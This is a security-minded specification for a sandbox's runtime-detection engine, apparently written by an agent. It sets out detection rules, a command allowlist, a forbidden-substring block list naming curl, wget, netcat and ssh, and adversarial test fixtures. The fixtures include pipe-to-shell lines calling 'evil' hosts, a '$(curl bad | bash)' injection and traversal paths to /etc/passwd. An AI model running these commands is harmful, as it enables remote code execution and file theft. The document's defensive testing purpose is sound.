# dasDocker — Runtime & Dependency Auto-Detection Engine (Phase 1)

**Document type:** Heuristic specification (static analysis only — **no code execution**).  
**Audience:** Squad B implementers (Orchestrator / worker), Frontend (`multi_runtime` UX), Security review.  
**Rules:** Agent 07 delivers **architecture + tests**; Phase 2 implements.

---

## 0. Principles (Rules 1 & 2)

| Principle | Requirement |
|-----------|---------------|
| **Zero execution during detection** | The engine MUST only read **normalized file metadata** (path, basename, leaf name, declared size caps). It MUST NOT invoke interpreters, compilers, Makefile targets, lifecycle scripts, or `Dockerfile` `RUN` during detection. |
| **Treat candidates as hostile** | Any manifest (e.g., `Makefile`, `.sh`, `Dockerfile`) is **never** trusted for install command generation unless after **allowlist §5** rejection it is discarded. |
| **Generated commands** | Outputs are **arrays of allowlisted primitives** assembled from templates keyed by detected runtime—not free-form shell from user repos. |
| **Failure contract** | If no runnable runtime is confidently selected → session creation fails upstream with **`FAILED`** and `failure_reason=RUNTIME_UNDETECTABLE` (aligns with Orchestrator terminal meta). |

---

## 1. Artifact intake & normalization (pre-scan)

Before signal scoring:

1. **Reject path traversal and control characters.** Only accept relative paths where `basename` passes `^[A-Za-z0-9][A-Za-z0-9._+-]*$` for single-segment filenames or POSIX-safe multi-segments with no `..`, no NUL, depth ≤ **32**.  
2. **Symlinks:** follow **never** during detection → treat symlink target as opaque (count parent file presence only if policy permits). Default: **symlink contributes no signals**.  
3. **Max manifest size:** First **256 KiB** of each candidate file MAY be scanned as text for field extraction; overflow → flag `MANIFEST_TRUNCATED`.  
4. **Binary blobs:** Presence-only for lockfiles/binary packages; never execute.

*(Justification: least privilege intake — prevents ZIP bombs and malformed trees from widening attack surface.)*

---

## 2. Runtime Detection Decision Table (≥ 8 runtimes)

**Priority tier** applies when resolving **tie-breaks**: `HIGH` defeats `MEDIUM` when weighted scores collide (see §3). **`Docker-native`** never auto-wins solely on `Dockerfile` without user confirmation (`multi_runtime` or explicit operator choice)—see §2.11.

### 2.1 Node.js (`runtimeId: node`)

| Aspect | Specification |
|--------|----------------|
| **Detection signal(s)** | `package.json` at scanned root OR at single discovered app root ≤ depth 2 → **strong**. `pnpm-lock.yaml` / `yarn.lock` / `package-lock.json` → **supporting** (+confidence). `.nvmrc`/`.node-version` → **weak** (+confidence only). |
| **Priority (signal conflict)** | **HIGH** when `package.json` parse succeeds and declares `"private"` OR `"engines.node"` OR non-empty `"dependencies"` / `"scripts"`. Down-rank if `package.json` is **JSON parse failure** → treat file as absent unless recoverable BOM-strip. |
| **Install command (template)** | If `pnpm-lock.yaml` → `pnpm install --frozen-lockfile`. Else if `yarn.lock` → `yarn install --immutable` (fallback `yarn install --frozen-lockfile` Phase 2). Else → `npm ci` if `package-lock.json`; else **`npm install`**. Generated args MUST be literal flags only — no script names. |
| **Entry heuristic** | Prefer `package.json` fields in order: `bin` single export (object first key)/`main`/`module`. Else `./index.js`. If `npm start`/`scripts.start` references a file, STATICALLY parse ONLY if string matches **`^\\.?/[a-zA-Z0-9_./+-]+\\.(jsx?|tsx?|mjs|cjs)$`** else **do not infer** → `ENTRY_UNCERTAIN`. |
| **Confidence** | Start **0.45** + **0.35** if lockfile matched install path + **0.15** if `engines` semver present − **0.25** if competing Python `pyproject.toml` at same depth (tie → §3). Cap **1.0**. |

### 2.2 Python (`python`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `pyproject.toml` (PEP 621 **`[project]`** or Poetry section) → **strong**. `requirements.txt`/`requirements/*.txt` → **strong**. `Pipfile` → **medium-high**. `setup.py`/`setup.cfg` → **medium** only if no PEP621. `manage.py` + `**/settings.py` → **medium** Django hint (+confidence Node-unrelated). `.python-version`/`.venv` dirs → weak. |
| **Priority** | **MEDIUM** tier default; escalate to HIGH if only Python signals exist in tree. |
| **Install template** | If Poetry (`[tool.poetry]`): **`poetry install --no-root --no-ansi --no-interaction`** (requires Poetry in sandbox image Phase 2). If only `requirements.txt`: **`pip install -r requirements.txt`** (path literal from allowlist basename). Pipenv: **`pipenv install --deploy`**. PEP621 with **explicit** `[build-system]` + lock missing → **`pip install .`** ONLY if Squad A whitelist permits; otherwise flag `PIP_INSTALL_DOT_FORBIDDEN` + `multi_runtime`. |
| **Entry heuristic** | Prefer `./src/<pkg>/main.py`, else `./main.py`, `./app.py`, `./__main__.py`, else `./wsgi.py`/`./asgi.py` if Flask/Django heuristics (static imports in first 256 lines). Else first `**/if __name__ == "__main__"` in depth order (max 50 files scanned for performance). |
| **Confidence** | Base **0.5** (+0.25 lock/poetry.lock; −0.2 if `Makefile` invokes `pip`/`python` without manifest — Makefile never increases Python score). |

### 2.3 Go (`go`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `go.mod` → **HIGH**. Presence of **`main` package file** `./main.go` → supporting. |
| **Priority** | **HIGH** when valid `go.mod` module line parses. |
| **Install** | **`go mod download`** then **`go build -o /tmp/out ./...`** OR **`go build ./cmd/<name>`** if exactly one `cmd/*` subtree (path allowlisted). NEVER `go run`. |
| **Entry** | If `cmd/<x>/main.go` singleton → `./cmd/<x>`. Else if root `main.go` → `./`. Else first `main` package by static `package main` scan (bounded files). |
| **Confidence** | **0.75** baseline with `go.mod`; +0.15 single `cmd/`. |

### 2.4 Rust (`rust`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `Cargo.toml` **workspace** root → HIGH. Nested member crates — detector picks **workspace root**. |
| **Priority** | **HIGH** |
| **Install** | **`cargo fetch`** (preferred) OR **`cargo build --release`** for compile-all dep resolution (Phase 2 chooses based on sandbox policy). Commands MUST NOT include arbitrary `--features`; default features only unless lockfile hashed allowlist extension. |
| **Entry** | Read `Cargo.toml` **static**: `[[bin]]` target `name` path; default `src/main.rs` if binary exists; workspace default member. |
| **Confidence** | **0.82** |

### 2.5 Java (`java`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `pom.xml` → Maven **HIGH**. `build.gradle`/`build.gradle.kts` → Gradle **HIGH**. `mvnw`/`gradlew` **do not contribute** executable install commands (**wrapper scripts forbidden** unless Squad A-approved copy into read-only toolchain path — default **forbidden**). |
| **Priority** | Resolve Maven vs Gradle by **mtime / depth-first first hit** irrelevant — prefer **Maven if both exist at same depth** else Gradle. |
| **Install** | Maven: **`mvn -B -DskipTests package`**. Gradle: **`gradle build -x test`** via **pinned system Gradle**, not `./gradlew`. |
| **Entry** | Parse XML/KotlinDSL **lightly**: Maven exec plugin `<mainClass>`; Gradle `application { mainClass }`; else heuristic `**/src/main/java/**/Main.java`/`Application.java`. |
| **Confidence** | **0.72** |

### 2.6 Ruby (`ruby`)

| Aspect | Specification |
|--------|----------------|
| **`Gemfile`** | HIGH |
| **Install** | **`bundle install --deployment`** if `Gemfile.lock` else **`bundle install --path vendor/bundle`**. |
| **Entry** | `config.ru` (Rack) → **`bundle exec rackup` NOT generated** unless allowlist expands in Phase 2; instead record entry **file path** `./config.ru` + mode `rack` → UI confirmation. Fallback `./app.rb`/`./main.rb`. |
| **Confidence** | **0.65** |

### 2.7 PHP (`php`)

| Aspect | Specification |
|--------|----------------|
| **`composer.json`** | HIGH |
| **Install** | **`composer install --no-dev --prefer-dist`** (prefer lock) |
| **Entry** | `./public/index.php` preferred, else `./index.php` |
| **Confidence** | **0.63** |

### 2.8 .NET / C# (`dotnet`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `*.sln`, `*.csproj`, `global.json`, `packages.lock.json` → **HIGH** tier .NET presence. |
| **Priority** | **HIGH** if `.sln` or executable `*.csproj` `<OutputType>Exe</OutputType>`. |
| **Install** | **`dotnet restore`** on chosen project/solution path (allowlisted basename). **`dotnet publish -c Release -o ./out`** only if build required before run — orchestrator MAY split restore vs publish in Phase 2. |
| **Entry** | `dotnet run --project ./path/csproj` **disallowed** inline; expose **`detected_dll_or_exe`** + static `Program.cs` heuristic; safest default **`dotnet exec ./path.dll`** after publish if single artifact. |
| **Confidence** | **0.70** |

### 2.9 Docker-native (`docker-native`)

| Aspect | Specification |
|--------|----------------|
| **Signals** | `Dockerfile` or `docker-compose.yml` at root (**never** executes `docker build` inside session — see below). |
| **Priority** | **LOW auto-rank.** Docker-native MUST NOT override language signals without operator confirmation (**`multi_runtime` true** whenever language + Dockerfile). |
| **Install (declarative)** | **NOT** emitted as sandbox install command chain. Detection output: **`build_plan: static_dockerfile_only`**. Alternative to nested Docker (**forbidden**): Orchestrator performs **controlled image build outside sandbox** BuildKit (**no DinD**) with Dockerfile **subset validator** rejecting `DOCKER_HOST`, `-v`, `--privileged`, `socket` mounts — OR worker runs **OCI container from pre-built hardened base** and **extracts inferred language** via static `COPY` tree simulation (implementation Phase 2). |
| **Entry** | `CMD`/`ENTRYPOINT` JSON parse only; if parse fails → `ENTRY_UNCERTAIN`. NEVER run `ENTRYPOINT`. |
| **Confidence** | **0.55** capped until human confirms **Use container plan**. |

*(Security note: Dockerfile `RUN curl | bash` is **classification-only** marker — such lines increase **risk tier** and **block auto-run** regardless of §5 allowance.)*

### 2.10 Makefile / task runners (explicit non-runtime)

**`Makefile`** / `Taskfile.yml` / `justfile`: increase **`CI_SCRIPT_RISK`** counter only. Never generate install/start from Makefile unless Squad A-signed **narrow** extractor for `targets: install` naming — default **OFF**.

---

## 3. Conflict Resolution Rules

### 3.1 Weighted priority ladder (single winner)

1. Count **strong signals** per runtime (table §2).  
2. Apply **tier**: HIGH > MEDIUM for tie.  
3. If still tie: prefer runtime with **highest computed confidence** (§2).  
4. If confidence within **0.05**: set **`multi_runtime: true`** and emit **`suggested_runtime`** (highest) + **`alternates`**.  
5. If **`docker-native`** would win but any language signal ≥ **0.55** → **language wins** for suggestion; Docker remains alternate + `multi_runtime` unless operator disabled polyglot guard.

### 3.2 Full combination policy (2+ simultaneous signals)

| Situation | Outcome |
|-----------|---------|
| Node + Python strong at same root | `multi_runtime: true`; suggest highest confidence; **block auto-start** until UI picks (or API `runtime_override`). |
| Go + Rust | Rare; if both `go.mod` and `Cargo.toml` at root → `multi_runtime: true` (both HIGH). |
| Java (Maven) + Java (Gradle) same dir | Prefer Maven if `pom.xml` depth ≤ Gradle; else Gradle; if both valid → `multi_runtime: false` but log `JAVA_DUAL_BUILD_WARNING`. |
| Dockerfile + any language | Language suggested; `docker-native` in `alternates`; `multi_runtime: true` if confidence gap < **0.12**. |
| Makefile claims “install” + manifests | **Ignore Makefile** for command generation; manifests determine runtime. |
| Only lockfile (e.g., `yarn.lock`) without `package.json` | **Do not** detect Node; treat as **incomplete** → `RUNTIME_UNDETECTABLE` unless recovery finds `package.json` within depth. |
| Malformed dual `package.json` / `pyproject.toml` | Parse errors → treat as **absent**; if all absent → `RUNTIME_UNDETECTABLE`. |

### 3.3 `multi_runtime` flag (UI / API)

`multi_runtime: true` requires:

- UI shows **picker** with confidence bars and **risk badges** (Makefile/Dockerfile/script hints).  
- API accepts final `runtime_id` + optional `entry_override` (still allowlisted path shape).

### 3.4 No signals

If **no runtime reaches minimum confidence `0.45`** after scan → **`FAILED` pre-queue** with reason **`RUNTIME_UNDETECTABLE`** and audit log `detection_trace` (hashed tree manifest).

---

## 4. Confidence score logic (engine-wide)

| Component | Weight |
|-----------|--------|
| Strong manifest present | +0.40 |
| Lockfile aligned with install template | +0.20 |
| Entry resolved without `ENTRY_UNCERTAIN` | +0.15 |
| Conflicting strong second runtime | −0.20 |
| Makefile / shell script references `curl|bash` in first 2k scan of file | −0.10 (cap −0.30) |
| Dockerfile `RUN` with pipe to shell | −0.15 risk (does not add execution) |

Final score **clamped [0,1]**. **Auto-proceed** only if `score ≥ 0.62` AND `multi_runtime == false` AND §5 allowlist passes.

---

## 5. Security Constraints on Generated Commands (allowlist)

### 5.1 Allowed command templates (exact families)

Each generated line MUST match **one** row (regex on full string **after** shell-escape validation):

| ID | Pattern (full line) | Notes |
|----|---------------------|-------|
| A1 | `^npm ci$` | |
| A2 | `^npm install$` | no extra args |
| A3 | `^yarn install( --immutable| --frozen-lockfile)?$` | |
| A4 | `^pnpm install --frozen-lockfile$` | |
| A5 | `^pip install -r [A-Za-z0-9._/+-]+$` | path single-segment or `requirements/` subpath only |
| A6 | `^pipenv install --deploy$` | |
| A7 | `^poetry install --no-root --no-ansi --no-interaction$` | |
| A8 | `^go mod download$` | |
| A9 | Starts with ``go build -o /tmp/`` + one safe binary name + one arg that is EITHER the literal `./...` OR a single `./` path segment with no `..` | Matches standard module-wide build vs single `./cmd/name` builds |
| A10 | `^cargo fetch$` **or** `^cargo build --release$` | |
| A11 | `^mvn -B -DskipTests package$` | |
| A12 | `^gradle build -x test$` | system gradle only |
| A13 | `^bundle install( --deployment| --path vendor/bundle)$` | |
| A14 | `^composer install --no-dev --prefer-dist$` | |
| A15 | `^dotnet restore( [A-Za-z0-9._/+-]+\.(sln|csproj))?$` | single trailing path |

**Everything else ⇒ REJECT** → fallback `GENERATED_COMMAND_REJECTED` log + **`multi_runtime` / manual**.

### 5.2 Forbidden substrings anywhere in candidate command

If any appear after trimming → **discard generation** (`INSTALL_FORBIDDEN`):

- `\|`, `` ` `` , `$\(`, `\${`, `$(`, `` $` ``, `&&`, `;`, `||`, `&`, `>`, `<`, `\n`  
- `curl`, `wget`, `fetch`, `eval`, `exec`, `bash`, `sh `, `sudo`, `su `, `chmod`, `chown`, `mount`, `docker`, `kubectl`, `ssh`, `nc `, `netcat`  
- URL schemes `http://`, `https://`  
- glob `**` or `*` in args (no globs)  
- relative parent beyond single approved subdir (`..` forbidden)

*(Justification: blocks pipe-to-shell installers, substitution, chaining, lateral movement primitives.)*

### 5.3 Entry-point validation

Accepted entry paths MUST satisfy same basename rules as §1 and MUST NOT point to extensions `.sh`, `.bash`, `.zsh`, `Makefile`, `Dockerfile` unless operator override with elevated policy.

---

## 6. Test Case Specification

### 6.1 Canonical positive trees (per runtime)

Represented as POSIX paths (content minimal).

#### T-node-001 — Node / npm lock

```text
./package.json
./package-lock.json
./src/index.js
```
Expect: `runtime=node`, install `npm ci`, entry `./src/index.js` or `./index.js`.

#### T-pyr-002 — Poetry

```text
./pyproject.toml           # contains [tool.poetry]
./poetry.lock
./service/__main__.py
```
Expect: `python`, `poetry install...`, entry `service/__main__.py`.

#### T-go-003

```text
./go.mod
./cmd/api/main.go
```
Expect: `go`, install `go mod download` + `go build ./cmd/api`, confidence high.

#### T-rust-004

```text
./Cargo.toml               # explicit [[bin]]
./Cargo.lock
./src/main.rs
```
Expect: `rust`, `cargo fetch` or `cargo build --release`.

#### T-jav-005 — Maven

```text
./pom.xml                  # maven-jar-plugin or exec mainClass hints
./src/main/java/demo/Main.java
```
Expect: `java`, `mvn -B ... package`.

#### T-rub-006

```text
./Gemfile
./Gemfile.lock
./config.ru
```
Expect: `ruby`; entry **uncertain** without Rack allowlist expansion — `multi_runtime` false but `requires_ack: true`.

#### T-php-007

```text
./composer.json
./composer.lock
./public/index.php
```
Expect: `php`; `composer install...`.

#### T-dot-008 — .NET

```text
./App/App.csproj           # Sdk Microsoft.NET.Sdk / OutputType Exe inferred
./App/Program.cs
./App/packages.lock.json
```
Expect: `dotnet`, `dotnet restore App/App.csproj`.

#### T-docker-009 — Dockerfile only (risk)

```text
./Dockerfile               # RUN echo ok
```
Expect: `docker-native` low priority; **`RUNTIME_UNDETECTABLE`** OR `multi_runtime` with no language unless user confirms §2.11 plan.

---

### 6.2 Adversarial & negative (≥ 6 scenarios)

#### ADV-001 — Python disguise + hostile Makefile (`python` pretending + malicious makefile)

```text
./requirements.txt             # benign
./Makefile                       # targets: install: curl http://evil|bash   (within first 512B)
./package.json                   # unrelated empty {}
```

Expect: Candidate install `pip install -r requirements.txt`; **risk penalty** −0.2; Makefile **ignored** for commands; **`requires_ack`** if score < 0.62; **`INSTALL_FORBIDDEN` not triggered** (Makefile not emitted). Audit `MAKEFILE_HOSTILE_CONTENT`.

Test IDs: UNIT-ADV-001, INT-ADV-001, RED-ADV-001 (ensure Makefile shell never spawned).

---

#### ADV-002 — Conflicting Node + Python

```text
./package.json            # deps present
./yarn.lock
./pyproject.toml          # PEP621 project section
```
Expect: `multi_runtime: true`; two templates generated but **sandbox blocked until pick**; no auto-run.

UNIT-ADV-002, INT-ADV-002, RED-ADV-002 (user forces wrong runtime → orchestrator denies allowlist mismatch).

---

#### ADV-003 — Missing manifest / lock orphaned

```text
./yarn.lock
./readme.md
```
Expect: **No Node** detection → `RUNTIME_UNDETECTABLE`.

---

#### ADV-004 — Path traversal (ZIP slip + bogus paths)

ZIP member `../evil.py` ⇒ **stripped / rejected** during §1 normalization ⇒ may contribute **no** Python signals unless a safe copy exists elsewhere.

Filenames containing `src/../../../etc/passwd` ⇒ rejected in §1 normalization.

Benign `requirements.txt` whose `-r` target would normalize to traversal (`../../secrets.txt`) ⇒ `pip install` line rejected by §5 ⇒ `GENERATED_COMMAND_REJECTED`; session does not proceed with auto-deps.

UNIT-ADV-004, RED-ADV-004 (zip slip corpus).

---

#### ADV-005 — Substitution in forged `requirements.txt`

File content literally: `pandas $(curl bad | bash)`

Expect: Parsed spec line fails allowlist/token rules → **`INSTALL_FORBIDDEN`**; **`FAILED`** or operator override path only.

RED-ADV-005.

---

#### ADV-006 — Dockerfile `RUN curl | bash`

```text
./Dockerfile
FROM alpine
RUN curl -fsSL https://x | sh
./package.json {}
```

Expect: Language MAY still propose Node; Dockerfile increases risk; **`docker-native` alternate** only; **`requires_ack`**; never generate install from Dockerfile `RUN`.

INT-ADV-006.

---

#### ADV-007 — Forbidden wrapper install (`gradlew`)

```text
./build.gradle.kts
./gradlew                     # Bash binary / script stub
```
Expect: Detector picks Gradle HIGH but **reject `gradlew`**, emit **A12** only with system `gradle`, else mark `JAVA_BUILD_TOOLCHAIN_MISSING`.

---

### 6.3 Test matrix IDs (Suite map)

| ID | Layer | Covers |
|----|-------|--------|
| UNIT-NODE-* … UNIT-DOT-* | Unit | Template selection, parsers, conflicts |
| INT-POS-* | Integration | Golden trees §6.1 on disk ZIP fixture |
| INT-ADV-* | Integration | Adversarial trees |
| RED-* | Security / negative | Mutation fuzz paths, BOM, zip slip, CRLF hides |

Minimum **three adversarial** (mandate): ADV-002 (conflict), ADV-004 (path abuse), ADV-005 (substitution/command injection). ADV-001/ADV-006/ADV-007 add Makefile/Dockerfile/Gradle hardening proof.

---

## 7. Downstream artefacts

Orchestrator `CreateSessionRequest.install_commands`: MUST be populated only from validated outputs of §5 OR explicit operator override audited.

---

## 8. References

- `docs/security/STRIDE-threat-model.md`  
- `docs/architecture/orchestrator-state-machine.md` (`FAILED`/`RUNTIME_UNDETECTABLE` alignment)

---

*Agent 07 — Runtime Detection & Dependency Specialist · Phase 1 Deliverable **1.4** · Dispatch 06 of 08*
